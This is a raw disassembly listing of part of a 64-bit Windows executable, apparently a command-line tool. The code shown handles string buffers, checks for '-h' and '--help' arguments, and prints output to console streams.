   140002452:	48 8b c8             	mov    %rax,%rcx
   140002455:	e8 ea 71 00 00       	call   0x140009644
   14000245a:	41 c6 04 3c 00       	movb   $0x0,(%r12,%rdi,1)
   14000245f:	48 83 fb 0f          	cmp    $0xf,%rbx
   140002463:	76 2d                	jbe    0x140002492
   140002465:	48 8d 53 01          	lea    0x1(%rbx),%rdx
   140002469:	49 8b c7             	mov    %r15,%rax
   14000246c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002473:	72 15                	jb     0x14000248a
   140002475:	48 83 c2 27          	add    $0x27,%rdx
   140002479:	4d 8b 7f f8          	mov    -0x8(%r15),%r15
   14000247d:	49 2b c7             	sub    %r15,%rax
   140002480:	48 83 e8 08          	sub    $0x8,%rax
   140002484:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002488:	77 74                	ja     0x1400024fe
   14000248a:	49 8b cf             	mov    %r15,%rcx
   14000248d:	e8 46 63 00 00       	call   0x1400087d8
   140002492:	4c 89 65 28          	mov    %r12,0x28(%rbp)
   140002496:	4d 8b fc             	mov    %r12,%r15
   140002499:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   14000249d:	48 8b 45 08          	mov    0x8(%rbp),%rax
   1400024a1:	4c 8b 65 a0          	mov    -0x60(%rbp),%r12
   1400024a5:	0f b6 5c 24 30       	movzbl 0x30(%rsp),%ebx
   1400024aa:	48 83 f9 0f          	cmp    $0xf,%rcx
   1400024ae:	76 31                	jbe    0x1400024e1
   1400024b0:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   1400024b4:	48 8b c8             	mov    %rax,%rcx
   1400024b7:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400024be:	72 19                	jb     0x1400024d9
   1400024c0:	48 83 c2 27          	add    $0x27,%rdx
   1400024c4:	48 8b 40 f8          	mov    -0x8(%rax),%rax
   1400024c8:	48 2b c8             	sub    %rax,%rcx
   1400024cb:	48 83 e9 08          	sub    $0x8,%rcx
   1400024cf:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1400024d3:	0f 87 1f 01 00 00    	ja     0x1400025f8
   1400024d9:	48 8b c8             	mov    %rax,%rcx
   1400024dc:	e8 f7 62 00 00       	call   0x1400087d8
   1400024e1:	ff 44 24 3c          	incl   0x3c(%rsp)
   1400024e5:	49 ff c4             	inc    %r12
   1400024e8:	4c 3b 65 d0          	cmp    -0x30(%rbp),%r12
   1400024ec:	0f 8d 2a 01 00 00    	jge    0x14000261c
   1400024f2:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
   1400024f6:	45 33 db             	xor    %r11d,%r11d
   1400024f9:	e9 22 fd ff ff       	jmp    0x140002220
   1400024fe:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002505:	00 00 
   140002507:	45 33 c9             	xor    %r9d,%r9d
   14000250a:	45 33 c0             	xor    %r8d,%r8d
   14000250d:	33 d2                	xor    %edx,%edx
   14000250f:	33 c9                	xor    %ecx,%ecx
   140002511:	ff 15 51 7f 00 00    	call   *0x7f51(%rip)        # 0x14000a468
   140002517:	cc                   	int3
   140002518:	48 8d 15 19 83 00 00 	lea    0x8319(%rip),%rdx        # 0x14000a838
   14000251f:	48 8b 0d d2 7b 00 00 	mov    0x7bd2(%rip),%rcx        # 0x14000a0f8
   140002526:	e8 25 eb ff ff       	call   0x140001050
   14000252b:	e9 8d 00 00 00       	jmp    0x1400025bd
   140002530:	4c 8d 45 08          	lea    0x8(%rbp),%r8
   140002534:	48 83 f9 0f          	cmp    $0xf,%rcx
   140002538:	4c 0f 47 c0          	cmova  %rax,%r8
   14000253c:	48 83 fa 02          	cmp    $0x2,%rdx
   140002540:	75 08                	jne    0x14000254a
   140002542:	66 41 81 38 2d 68    	cmpw   $0x682d,(%r8)
   140002548:	74 24                	je     0x14000256e
   14000254a:	4c 8d 45 08          	lea    0x8(%rbp),%r8
   14000254e:	48 83 f9 0f          	cmp    $0xf,%rcx
   140002552:	4c 0f 47 c0          	cmova  %rax,%r8
   140002556:	48 83 fa 06          	cmp    $0x6,%rdx
   14000255a:	75 20                	jne    0x14000257c
   14000255c:	41 81 38 2d 2d 68 65 	cmpl   $0x65682d2d,(%r8)
   140002563:	75 17                	jne    0x14000257c
   140002565:	66 41 81 78 04 6c 70 	cmpw   $0x706c,0x4(%r8)
   14000256c:	75 0e                	jne    0x14000257c
   14000256e:	e8 6d fa ff ff       	call   0x140001fe0
   140002573:	e8 f8 fa ff ff       	call   0x140002070
   140002578:	33 db                	xor    %ebx,%ebx
   14000257a:	eb 46                	jmp    0x1400025c2
   14000257c:	48 8d 15 dd 82 00 00 	lea    0x82dd(%rip),%rdx        # 0x14000a860
   140002583:	48 8b 0d 6e 7b 00 00 	mov    0x7b6e(%rip),%rcx        # 0x14000a0f8
   14000258a:	e8 c1 ea ff ff       	call   0x140001050
   14000258f:	48 8d 55 08          	lea    0x8(%rbp),%rdx
   140002593:	48 83 7d 20 0f       	cmpq   $0xf,0x20(%rbp)
   140002598:	48 0f 47 55 08       	cmova  0x8(%rbp),%rdx
   14000259d:	4c 8b 45 18          	mov    0x18(%rbp),%r8
   1400025a1:	48 8b c8             	mov    %rax,%rcx
   1400025a4:	e8 27 f1 ff ff       	call   0x1400016d0
   1400025a9:	48 8d 15 f8 80 00 00 	lea    0x80f8(%rip),%rdx        # 0x14000a6a8
   1400025b0:	48 8b c8             	mov    %rax,%rcx
   1400025b3:	e8 98 ea ff ff       	call   0x140001050
   1400025b8:	e8 b3 fa ff ff       	call   0x140002070
   1400025bd:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400025c2:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   1400025c6:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400025ca:	0f 86 92 0a 00 00    	jbe    0x140003062
   1400025d0:	48 ff c2             	inc    %rdx
   1400025d3:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   1400025d7:	48 8b c1             	mov    %rcx,%rax
   1400025da:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400025e1:	72 2f                	jb     0x140002612
   1400025e3:	48 83 c2 27          	add    $0x27,%rdx
   1400025e7:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400025eb:	48 2b c1             	sub    %rcx,%rax
   1400025ee:	48 83 e8 08          	sub    $0x8,%rax
   1400025f2:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400025f6:	76 1a                	jbe    0x140002612
   1400025f8:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400025ff:	00 00 
   140002601:	45 33 c9             	xor    %r9d,%r9d
   140002604:	45 33 c0             	xor    %r8d,%r8d
   140002607:	33 d2                	xor    %edx,%edx
   140002609:	33 c9                	xor    %ecx,%ecx
   14000260b:	ff 15 57 7e 00 00    	call   *0x7e57(%rip)        # 0x14000a468
   140002611:	cc                   	int3
   140002612:	e8 c1 61 00 00       	call   0x1400087d8
   140002617:	e9 46 0a 00 00       	jmp    0x140003062
   14000261c:	44 0f b6 64 24 32    	movzbl 0x32(%rsp),%r12d
   140002622:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002627:	44 0f b6 44 24 31    	movzbl 0x31(%rsp),%r8d
   14000262d:	44 0f b6 4c 24 33    	movzbl 0x33(%rsp),%r9d
   140002633:	44 0f b6 54 24 34    	movzbl 0x34(%rsp),%r10d
   140002639:	84 db                	test   %bl,%bl
   14000263b:	75 0b                	jne    0x140002648
   14000263d:	45 84 e4             	test   %r12b,%r12b
   140002640:	75 06                	jne    0x140002648
   140002642:	b3 01                	mov    $0x1,%bl
   140002644:	44 0f b6 e3          	movzbl %bl,%r12d
   140002648:	45 84 c9             	test   %r9b,%r9b
   14000264b:	75 13                	jne    0x140002660
   14000264d:	45 84 d2             	test   %r10b,%r10b
   140002650:	75 0e                	jne    0x140002660
   140002652:	41 0f b6 c0          	movzbl %r8b,%eax
   140002656:	45 84 c0             	test   %r8b,%r8b
   140002659:	0f 44 c1             	cmove  %ecx,%eax
   14000265c:	88 44 24 31          	mov    %al,0x31(%rsp)
   140002660:	e8 7b f9 ff ff       	call   0x140001fe0
   140002665:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002668:	0f 11 45 e8          	movups %xmm0,-0x18(%rbp)
   14000266c:	66 0f 6f 0d fc 82 00 	movdqa 0x82fc(%rip),%xmm1        # 0x14000a970
   140002673:	00 
   140002674:	f3 0f 7f 4d f8       	movdqu %xmm1,-0x8(%rbp)
   140002679:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   14000267d:	33 d2                	xor    %edx,%edx
   14000267f:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140002683:	e8 b8 15 00 00       	call   0x140003c40
   140002688:	84 c0                	test   %al,%al
   14000268a:	75 20                	jne    0x1400026ac
   14000268c:	48 8d 15 e5 81 00 00 	lea    0x81e5(%rip),%rdx        # 0x14000a878
   140002693:	48 8b 0d 5e 7a 00 00 	mov    0x7a5e(%rip),%rcx        # 0x14000a0f8
   14000269a:	e8 b1 e9 ff ff       	call   0x140001050
   14000269f:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400026a4:	45 33 e4             	xor    %r12d,%r12d
   1400026a7:	e9 58 09 00 00       	jmp    0x140003004
   1400026ac:	48 8d 15 ed 81 00 00 	lea    0x81ed(%rip),%rdx        # 0x14000a8a0
   1400026b3:	48 8b 0d 36 7a 00 00 	mov    0x7a36(%rip),%rcx        # 0x14000a0f0
   1400026ba:	e8 91 e9 ff ff       	call   0x140001050
   1400026bf:	48 8d 15 ea f8 ff ff 	lea    -0x716(%rip),%rdx        # 0x140001fb0
   1400026c6:	48 8b c8             	mov    %rax,%rcx
   1400026c9:	ff 15 09 7a 00 00    	call   *0x7a09(%rip)        # 0x14000a0d8
   1400026cf:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
   1400026d3:	48 8b c8             	mov    %rax,%rcx
   1400026d6:	ff 15 04 7a 00 00    	call   *0x7a04(%rip)        # 0x14000a0e0
   1400026dc:	48 8d 15 9d f8 ff ff 	lea    -0x763(%rip),%rdx        # 0x140001f80
   1400026e3:	48 8b c8             	mov    %rax,%rcx
   1400026e6:	ff 15 ec 79 00 00    	call   *0x79ec(%rip)        # 0x14000a0d8
   1400026ec:	48 8b c8             	mov    %rax,%rcx
   1400026ef:	48 8d 15 b2 7f 00 00 	lea    0x7fb2(%rip),%rdx        # 0x14000a6a8
   1400026f6:	e8 55 e9 ff ff       	call   0x140001050
   1400026fb:	48 8d 15 b6 81 00 00 	lea    0x81b6(%rip),%rdx        # 0x14000a8b8
   140002702:	48 8b 0d e7 79 00 00 	mov    0x79e7(%rip),%rcx        # 0x14000a0f0
   140002709:	e8 42 e9 ff ff       	call   0x140001050
   14000270e:	48 8d 15 9b f8 ff ff 	lea    -0x765(%rip),%rdx        # 0x140001fb0
   140002715:	48 8b c8             	mov    %rax,%rcx
   140002718:	ff 15 ba 79 00 00    	call   *0x79ba(%rip)        # 0x14000a0d8
   14000271e:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
   140002722:	48 8b c8             	mov    %rax,%rcx
   140002725:	ff 15 b5 79 00 00    	call   *0x79b5(%rip)        # 0x14000a0e0
   14000272b:	48 8d 15 4e f8 ff ff 	lea    -0x7b2(%rip),%rdx        # 0x140001f80
   140002732:	48 8b c8             	mov    %rax,%rcx
   140002735:	ff 15 9d 79 00 00    	call   *0x799d(%rip)        # 0x14000a0d8
   14000273b:	48 8b c8             	mov    %rax,%rcx
   14000273e:	48 8d 15 6b 81 00 00 	lea    0x816b(%rip),%rdx        # 0x14000a8b0
   140002745:	e8 06 e9 ff ff       	call   0x140001050
   14000274a:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000274d:	f3 0f 7f 45 80       	movdqu %xmm0,-0x80(%rbp)
   140002752:	33 c0                	xor    %eax,%eax
   140002754:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   140002758:	f3 0f 7f 45 a8       	movdqu %xmm0,-0x58(%rbp)
   14000275d:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140002761:	84 db                	test   %bl,%bl
   140002763:	74 6a                	je     0x1400027cf
   140002765:	48 8d 15 5c 81 00 00 	lea    0x815c(%rip),%rdx        # 0x14000a8c8
   14000276c:	48 8b 0d 7d 79 00 00 	mov    0x797d(%rip),%rcx        # 0x14000a0f0
   140002773:	e8 d8 e8 ff ff       	call   0x140001050
   140002778:	e8 13 25 00 00       	call   0x140004c90
   14000277d:	e8 fe 24 00 00       	call   0x140004c80
   140002782:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   140002786:	48 3b c8             	cmp    %rax,%rcx
   140002789:	74 31                	je     0x1400027bc
   14000278b:	4c 8b 08             	mov    (%rax),%r9
   14000278e:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140002792:	49 2b c9             	sub    %r9,%rcx
   140002795:	48 b8 67 66 66 66 66 	movabs $0x6666666666666667,%rax
   14000279c:	66 66 66 
   14000279f:	48 f7 e9             	imul   %rcx
   1400027a2:	48 c1 fa 04          	sar    $0x4,%rdx
   1400027a6:	4c 8b c2             	mov    %rdx,%r8
   1400027a9:	49 c1 e8 3f          	shr    $0x3f,%r8
   1400027ad:	4c 03 c2             	add    %rdx,%r8
   1400027b0:	49 8b d1             	mov    %r9,%rdx
   1400027b3:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1400027b7:	e8 e4 ec ff ff       	call   0x1400014a0
   1400027bc:	48 8d 15 e5 7e 00 00 	lea    0x7ee5(%rip),%rdx        # 0x14000a6a8
   1400027c3:	48 8b 0d 26 79 00 00 	mov    0x7926(%rip),%rcx        # 0x14000a0f0
   1400027ca:	e8 81 e8 ff ff       	call   0x140001050
   1400027cf:	48 bb ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rbx
   1400027d6:	aa aa 2a 
   1400027d9:	45 84 e4             	test   %r12b,%r12b
   1400027dc:	0f 84 c4 00 00 00    	je     0x1400028a6
   1400027e2:	48 8b 45 88          	mov    -0x78(%rbp),%rax
   1400027e6:	48 39 45 80          	cmp    %rax,-0x80(%rbp)
   1400027ea:	75 6a                	jne    0x140002856
   1400027ec:	48 8d 15 ed 80 00 00 	lea    0x80ed(%rip),%rdx        # 0x14000a8e0
   1400027f3:	48 8b 0d f6 78 00 00 	mov    0x78f6(%rip),%rcx        # 0x14000a0f0
   1400027fa:	e8 51 e8 ff ff       	call   0x140001050
   1400027ff:	e8 8c 24 00 00       	call   0x140004c90
   140002804:	e8 77 24 00 00       	call   0x140004c80
   140002809:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   14000280d:	48 3b c8             	cmp    %rax,%rcx
   140002810:	74 31                	je     0x140002843
   140002812:	4c 8b 08             	mov    (%rax),%r9
   140002815:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140002819:	49 2b c9             	sub    %r9,%rcx
   14000281c:	48 b8 67 66 66 66 66 	movabs $0x6666666666666667,%rax
   140002823:	66 66 66 
   140002826:	48 f7 e9             	imul   %rcx
   140002829:	48 c1 fa 04          	sar    $0x4,%rdx
   14000282d:	4c 8b c2             	mov    %rdx,%r8
   140002830:	49 c1 e8 3f          	shr    $0x3f,%r8
   140002834:	4c 03 c2             	add    %rdx,%r8
   140002837:	49 8b d1             	mov    %r9,%rdx
   14000283a:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   14000283e:	e8 5d ec ff ff       	call   0x1400014a0
   140002843:	48 8d 15 5e 7e 00 00 	lea    0x7e5e(%rip),%rdx        # 0x14000a6a8
   14000284a:	48 8b 0d 9f 78 00 00 	mov    0x789f(%rip),%rcx        # 0x14000a0f0
   140002851:	e8 fa e7 ff ff       	call   0x140001050
   140002856:	e8 15 29 00 00       	call   0x140005170
   14000285b:	e8 00 29 00 00       	call   0x140005160
   140002860:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002864:	48 3b c8             	cmp    %rax,%rcx
   140002867:	74 2a                	je     0x140002893
   140002869:	4c 8b 08             	mov    (%rax),%r9
   14000286c:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140002870:	49 2b c9             	sub    %r9,%rcx
   140002873:	48 8b c3             	mov    %rbx,%rax
   140002876:	48 f7 e9             	imul   %rcx
   140002879:	48 c1 fa 02          	sar    $0x2,%rdx
   14000287d:	4c 8b c2             	mov    %rdx,%r8
   140002880:	49 c1 e8 3f          	shr    $0x3f,%r8
   140002884:	4c 03 c2             	add    %rdx,%r8
   140002887:	49 8b d1             	mov    %r9,%rdx
   14000288a:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   14000288e:	e8 9d ea ff ff       	call   0x140001330
   140002893:	48 8d 15 0e 7e 00 00 	lea    0x7e0e(%rip),%rdx        # 0x14000a6a8
   14000289a:	48 8b 0d 4f 78 00 00 	mov    0x784f(%rip),%rcx        # 0x14000a0f0
   1400028a1:	e8 aa e7 ff ff       	call   0x140001050
   1400028a6:	b8 16 00 00 00       	mov    $0x16,%eax
   1400028ab:	80 7c 24 33 00       	cmpb   $0x0,0x33(%rsp)
   1400028b0:	0f 84 64 02 00 00    	je     0x140002b1a
   1400028b6:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400028b9:	48 85 ff             	test   %rdi,%rdi
   1400028bc:	75 41                	jne    0x1400028ff
   1400028be:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   1400028c3:	66 0f 6f 0d b5 80 00 	movdqa 0x80b5(%rip),%xmm1        # 0x14000a980
   1400028ca:	00 
   1400028cb:	f3 0f 7f 4c 24 70    	movdqu %xmm1,0x70(%rsp)
   1400028d1:	f2 0f 10 05 47 80 00 	movsd  0x8047(%rip),%xmm0        # 0x14000a920
   1400028d8:	00 
   1400028d9:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   1400028df:	0f b6 05 42 80 00 00 	movzbl 0x8042(%rip),%eax        # 0x14000a928
   1400028e6:	88 44 24 68          	mov    %al,0x68(%rsp)
   1400028ea:	40 88 7c 24 69       	mov    %dil,0x69(%rsp)
   1400028ef:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   1400028f4:	41 be 01 00 00 00    	mov    $0x1,%r14d
   1400028fa:	e9 83 00 00 00       	jmp    0x140002982
   1400028ff:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   140002904:	4c 8d 75 28          	lea    0x28(%rbp),%r14
   140002908:	48 83 fe 0f          	cmp    $0xf,%rsi
   14000290c:	4d 0f 47 f7          	cmova  %r15,%r14
   140002910:	49 3b fd             	cmp    %r13,%rdi
   140002913:	0f 87 d1 07 00 00    	ja     0x1400030ea
   140002919:	48 83 ff 0f          	cmp    $0xf,%rdi
   14000291d:	77 19                	ja     0x140002938
   14000291f:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   140002924:	48 c7 44 24 58 0f 00 	movq   $0xf,0x58(%rsp)
   14000292b:	00 00 
   14000292d:	41 0f 10 06          	movups (%r14),%xmm0
   140002931:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   140002936:	eb 3f                	jmp    0x140002977
   140002938:	48 8b df             	mov    %rdi,%rbx
   14000293b:	48 83 cb 0f          	or     $0xf,%rbx
   14000293f:	49 3b dd             	cmp    %r13,%rbx
   140002942:	76 05                	jbe    0x140002949
   140002944:	49 8b dd             	mov    %r13,%rbx
   140002947:	eb 07                	jmp    0x140002950
   140002949:	48 3b d8             	cmp    %rax,%rbx
   14000294c:	48 0f 42 d8          	cmovb  %rax,%rbx
   140002950:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140002954:	e8 67 e9 ff ff       	call   0x1400012c0
   140002959:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000295e:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   140002963:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   140002968:	4c 8d 47 01          	lea    0x1(%rdi),%r8
   14000296c:	49 8b d6             	mov    %r14,%rdx
   14000296f:	48 8b c8             	mov    %rax,%rcx
   140002972:	e8 cd 6c 00 00       	call   0x140009644
   140002977:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000297c:	41 be 02 00 00 00    	mov    $0x2,%r14d
   140002982:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   140002987:	0f 10 00             	movups (%rax),%xmm0
   14000298a:	0f 11 45 48          	movups %xmm0,0x48(%rbp)
   14000298e:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002992:	0f 11 4d 58          	movups %xmm1,0x58(%rbp)
   140002996:	45 33 e4             	xor    %r12d,%r12d
   140002999:	4c 89 60 10          	mov    %r12,0x10(%rax)
   14000299d:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   1400029a4:	00 
   1400029a5:	44 88 20             	mov    %r12b,(%rax)
   1400029a8:	41 f6 c6 02          	test   $0x2,%r14b
   1400029ac:	74 59                	je     0x140002a07
   1400029ae:	41 83 e6 fd          	and    $0xfffffffd,%r14d
   1400029b2:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   1400029b7:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   1400029bc:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400029c0:	76 45                	jbe    0x140002a07
   1400029c2:	48 ff c2             	inc    %rdx
   1400029c5:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400029ca:	48 8b c1             	mov    %rcx,%rax
   1400029cd:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400029d4:	72 2b                	jb     0x140002a01
   1400029d6:	48 83 c2 27          	add    $0x27,%rdx
   1400029da:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400029de:	48 2b c1             	sub    %rcx,%rax
   1400029e1:	48 83 e8 08          	sub    $0x8,%rax
   1400029e5:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400029e9:	76 16                	jbe    0x140002a01
   1400029eb:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400029f0:	45 33 c9             	xor    %r9d,%r9d
   1400029f3:	45 33 c0             	xor    %r8d,%r8d
   1400029f6:	33 d2                	xor    %edx,%edx
   1400029f8:	33 c9                	xor    %ecx,%ecx
   1400029fa:	ff 15 68 7a 00 00    	call   *0x7a68(%rip)        # 0x14000a468
   140002a00:	cc                   	int3
   140002a01:	e8 d2 5d 00 00       	call   0x1400087d8
   140002a06:	90                   	nop
   140002a07:	41 f6 c6 01          	test   $0x1,%r14b
   140002a0b:	74 58                	je     0x140002a65
   140002a0d:	41 83 e6 fe          	and    $0xfffffffe,%r14d
   140002a11:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   140002a16:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   140002a1b:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002a1f:	76 44                	jbe    0x140002a65
   140002a21:	48 ff c2             	inc    %rdx
   140002a24:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002a29:	48 8b c1             	mov    %rcx,%rax
   140002a2c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002a33:	72 2b                	jb     0x140002a60
   140002a35:	48 83 c2 27          	add    $0x27,%rdx
   140002a39:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002a3d:	48 2b c1             	sub    %rcx,%rax
   140002a40:	48 83 e8 08          	sub    $0x8,%rax
   140002a44:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002a48:	76 16                	jbe    0x140002a60
   140002a4a:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140002a4f:	45 33 c9             	xor    %r9d,%r9d
   140002a52:	45 33 c0             	xor    %r8d,%r8d
   140002a55:	33 d2                	xor    %edx,%edx
   140002a57:	33 c9                	xor    %ecx,%ecx
   140002a59:	ff 15 09 7a 00 00    	call   *0x7a09(%rip)        # 0x14000a468
   140002a5f:	cc                   	int3
   140002a60:	e8 73 5d 00 00       	call   0x1400087d8
   140002a65:	4c 8d 45 a8          	lea    -0x58(%rbp),%r8
   140002a69:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   140002a6d:	48 8d 4d 48          	lea    0x48(%rbp),%rcx
   140002a71:	e8 6a 4d 00 00       	call   0x1400077e0
   140002a76:	90                   	nop
   140002a77:	48 8b 55 60          	mov    0x60(%rbp),%rdx
   140002a7b:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002a7f:	76 43                	jbe    0x140002ac4
   140002a81:	48 ff c2             	inc    %rdx
   140002a84:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   140002a88:	48 8b c1             	mov    %rcx,%rax
   140002a8b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002a92:	72 2b                	jb     0x140002abf
   140002a94:	48 83 c2 27          	add    $0x27,%rdx
   140002a98:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002a9c:	48 2b c1             	sub    %rcx,%rax
   140002a9f:	48 83 e8 08          	sub    $0x8,%rax
   140002aa3:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002aa7:	76 16                	jbe    0x140002abf
   140002aa9:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140002aae:	45 33 c9             	xor    %r9d,%r9d
   140002ab1:	45 33 c0             	xor    %r8d,%r8d
   140002ab4:	33 d2                	xor    %edx,%edx
   140002ab6:	33 c9                	xor    %ecx,%ecx
   140002ab8:	ff 15 aa 79 00 00    	call   *0x79aa(%rip)        # 0x14000a468
   140002abe:	cc                   	int3
   140002abf:	e8 14 5d 00 00       	call   0x1400087d8
   140002ac4:	b8 16 00 00 00       	mov    $0x16,%eax
   140002ac9:	80 7c 24 34 00       	cmpb   $0x0,0x34(%rsp)
   140002ace:	0f 84 10 02 00 00    	je     0x140002ce4
   140002ad4:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002ad7:	48 85 ff             	test   %rdi,%rdi
   140002ada:	75 43                	jne    0x140002b1f
   140002adc:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   140002ae1:	66 0f 6f 0d b7 7e 00 	movdqa 0x7eb7(%rip),%xmm1        # 0x14000a9a0
   140002ae8:	00 
   140002ae9:	f3 0f 7f 4c 24 70    	movdqu %xmm1,0x70(%rsp)
   140002aef:	f2 0f 10 05 39 7e 00 	movsd  0x7e39(%rip),%xmm0        # 0x14000a930
   140002af6:	00 
   140002af7:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   140002afd:	8b 05 35 7e 00 00    	mov    0x7e35(%rip),%eax        # 0x14000a938
   140002b03:	89 44 24 68          	mov    %eax,0x68(%rsp)
   140002b07:	40 88 7c 24 6c       	mov    %dil,0x6c(%rsp)
   140002b0c:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140002b11:	41 83 ce 04          	or     $0x4,%r14d
   140002b15:	e9 8b 00 00 00       	jmp    0x140002ba5
   140002b1a:	45 33 e4             	xor    %r12d,%r12d
   140002b1d:	eb aa                	jmp    0x140002ac9
   140002b1f:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   140002b24:	4c 8d 65 28          	lea    0x28(%rbp),%r12
   140002b28:	48 83 fe 0f          	cmp    $0xf,%rsi
   140002b2c:	4d 0f 47 e7          	cmova  %r15,%r12
   140002b30:	49 3b fd             	cmp    %r13,%rdi
   140002b33:	0f 87 b7 05 00 00    	ja     0x1400030f0
   140002b39:	48 83 ff 0f          	cmp    $0xf,%rdi
   140002b3d:	77 1a                	ja     0x140002b59
   140002b3f:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   140002b44:	48 c7 44 24 58 0f 00 	movq   $0xf,0x58(%rsp)
   140002b4b:	00 00 
   140002b4d:	41 0f 10 04 24       	movups (%r12),%xmm0
   140002b52:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   140002b57:	eb 40                	jmp    0x140002b99
   140002b59:	48 8b df             	mov    %rdi,%rbx
   140002b5c:	48 83 cb 0f          	or     $0xf,%rbx
   140002b60:	49 3b dd             	cmp    %r13,%rbx
   140002b63:	76 05                	jbe    0x140002b6a
   140002b65:	49 8b dd             	mov    %r13,%rbx
   140002b68:	eb 08                	jmp    0x140002b72
   140002b6a:	48 83 fb 16          	cmp    $0x16,%rbx
   140002b6e:	48 0f 42 d8          	cmovb  %rax,%rbx
   140002b72:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140002b76:	e8 45 e7 ff ff       	call   0x1400012c0
   140002b7b:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002b80:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   140002b85:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   140002b8a:	4c 8d 47 01          	lea    0x1(%rdi),%r8
   140002b8e:	49 8b d4             	mov    %r12,%rdx
   140002b91:	48 8b c8             	mov    %rax,%rcx
   140002b94:	e8 ab 6a 00 00       	call   0x140009644
   140002b99:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140002b9e:	41 83 ce 08          	or     $0x8,%r14d
   140002ba2:	45 33 e4             	xor    %r12d,%r12d
   140002ba5:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   140002baa:	0f 10 00             	movups (%rax),%xmm0
   140002bad:	0f 11 45 48          	movups %xmm0,0x48(%rbp)
   140002bb1:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002bb5:	0f 11 4d 58          	movups %xmm1,0x58(%rbp)
   140002bb9:	4c 89 60 10          	mov    %r12,0x10(%rax)
   140002bbd:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   140002bc4:	00 
   140002bc5:	c6 00 00             	movb   $0x0,(%rax)
   140002bc8:	41 f6 c6 08          	test   $0x8,%r14b
